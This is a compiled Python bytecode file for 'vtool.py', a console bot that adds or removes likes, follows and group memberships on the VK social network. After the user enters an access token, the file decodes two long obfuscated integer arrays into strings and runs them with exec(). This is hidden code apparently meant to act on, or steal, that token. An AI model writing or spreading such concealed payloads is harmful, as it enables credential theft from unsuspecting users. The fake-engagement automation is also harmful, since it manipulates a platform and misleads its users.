U
    l�^5  �                B   @   s`  d dl Z d dlZe �d� edd�Ze��  edd�Zdd� Zdd	� Zd
d� Zdd� Z	dd� Z
dd� Zdd� Zed� dZe�sLdZed� ed�Zedkr�e�  qzedkr�e�  qzedk� r�ed� ed�Zedkr�e
�  nedkr�e�  ndZed� qzedk�r>�zed�Zejed �Zejed!d"d#�Zee	d$d%d&d'd(d)d*d*d$d+d)d*d'd+d)d,d-d.d/d0d)d1d*d$d,d&d.d/d*d2d3g�� ee	d$d%d&d'd4d$d5d5d'd6d1d)d$d,d)d-d.d(d(d)d/d,d2d.d4d/d)d1d7d&d8d9d:d;d<d=d>d?d@d?dAd;dBd%d.d*d,d7d&d8d9d?dBd(d)d*d*d$d+d)d9d,dCd3g@�� eddD�Ze�edE � e��  W n   edF� Y nX qzdZed� qzedG� e��  dS )H�    N�clearz.tokensza+�rc                  C   sH   t �� } | d t| �d � } | dkr(dS tj| d�}tj|ddd�S d S )N�   � T�Zaccess_token�5.92�ru��vZlang)�f�readline�len�vk�Session�API)�token�session� r   �vtool.py�login   s    r   c                  C   s�   d} d}d}t � }td�}td� | t|�k r�t� }|d7 }|dkrP|d8 }q�n
|dkrZq"zB|jjt|d �t|d �|d d� | d7 } |d7 }td	� W q"   td
� Y q"X q"tdt|� d t|| � � d S �Nr   �[35mEnter the quantity: [0mr   r   TF�   )Zowner_idZitem_id�type�[32m Successful�[31m Error�#
[35mResults:[32m    Successful: �[31m    Failed: )�getlink�input�print�intr   �likes�add�str�Zlap�allZsuccZparamsZquantity�apir   r   r   r"      s,    &r"   c                  C   s\  d} d}d}t � }td�}td� |d dkr�| t|�k r�t� }|d7 }|dkr\|d8 }q�n
|dkrfq.z2|jjt|d �d� | d7 } |d7 }td	� W q.   td
� Y q.X q.n�| t|�k �r8t� }|d7 }|dkr�|d8 }�q8n
|dkr�q�z2|jjt|d �d� | d7 } |d7 }td	� W q�   td
� Y q�X q�tdt	|� d t	|| � � d S �Nr   r   r   �idr   TF)Zuser_idr   r   )Zgroup_idr   r   )
r   r   r    r!   r   �friendsr#   �groups�joinr$   r%   r   r   r   �	followers'   sL    r-   c                 C   s*   d}| D ]}|t t|d d ��7 }q|S )Nr   �   g      �?)�chrr!   )Zmassiver$   �nr   r   r   �decO   s    r1   c                  C   s�   d} d}d}t � }td�}td� | t|�k r�t� }|d7 }|dkrP|d8 }q�n
|dkrZq"zB|jjt|d �t|d �|d d� | d7 } |d7 }td	� W q"   td
� Y q"X q"tdt|� d t|| � � d S r   )r   r   r    r!   r   r"   �deleter$   r%   r   r   r   �unlikesT   s,    &r3   c                  C   s\  d} d}d}t � }td�}td� |d dkr�| t|�k r�t� }|d7 }|dkr\|d8 }q�n
|dkrfq.z2|jjt|d �d� | d7 } |d7 }td	� W q.   td
� Y q.X q.n�| t|�k �r8t� }|d7 }|dkr�|d8 }�q8n
|dkr�q�z2|jjt|d �d� | d7 } |d7 }td	� W q�   td
� Y q�X q�tdt	|� d t	|| � � d S r(   )
r   r   r    r!   r   r*   r2   r+   Zleaver$   r%   r   r   r   �unfollowersk   sL    r4   c                  C   s  d} d}d}d}d}t d�}tt|��D ]�}|| dkr@|d } || k rJq(|dkr�| dkr�z4|| dkrp|d7 }t|| � d}||| 7 }W q�   ||| 7 }Y q�X q(|dkr�|| dkr�||| 7 }q�d	}q(|d	kr(||| 7 }q(|d d
kr�d}|||fS )Nr   r   z[35mEnter the link: [0m�.�   �-r   �_r   �wZpost)r   �ranger   r!   )Zspace�stepr   ZfirstIDZsecondIDZlink�charr   r   r   r   �   s<    r   u�  [37m
 InvertedOnes              Vk: @inv_ones[32m
 ┏━━┳━━┳━━┳━━┓  ┏━━━━━┳━━━━━┳━━━━━┳━┓
 ┃  ┃  ┃    ┏┛  ┗━┓ ┏━┫  ┓  ┃  ┓  ┃ ┃
 ┗┓   ┏┫    ┗┓    ┃ ┃ ┃  ┗  ┃  ┗  ┃ ┗━━┓
  ┗━━━┛┗━━┻━━┛    ┗━┛ ┗━━━━━┻━━━━━┻━━━━┛
FTzf[35m[1][0m Add likes [35m
[2][0m Add followers [35m
[3][0m Other [35m

[4][0m Add token [35m
z&Please, enter your task's number: [0m�1�2�3z@[35m
[1][0m Delete likes [35m
[2][0m Delete followers [35m
z[31mEnter right number
�4z[35mEnter the token: [0mr   r   r   r	   i�$  i1  i+  iP  iu.  i�'  i�3  i})  i�4  i�  i-0  iP/  ip6  i�2  iL  i�  i]7  i�-  iU&  iM#  i'  i�  i�  im	  i�  i  iL  i�	  ip  i	  i�  i�,  �a�
z
[31mInvalid tokenr   )�osr   �system�openr   �closer   r"   r-   r1   r3   r4   r   r    Zdoner   ZtaskZtkr   r   r   r'   �execr9   �writer   r   r   r   �<module>   s\   


(( 


J�

